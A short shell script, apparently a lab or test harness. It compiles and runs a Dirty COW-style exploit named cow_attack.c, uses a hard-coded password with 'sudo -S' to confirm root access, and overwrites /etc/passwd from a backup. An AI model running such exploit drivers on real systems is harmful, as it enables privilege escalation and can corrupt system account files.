gcc -pthread cow_attack.c -o attack -lcrypt

./attack

echo "mypassword" |  sudo -S touch /success


echo "mypassword" | sudo -S cp /tmp/passwd.bak /etc/passwd

ls / -hil
echo "please check the success file at /"

exit 0

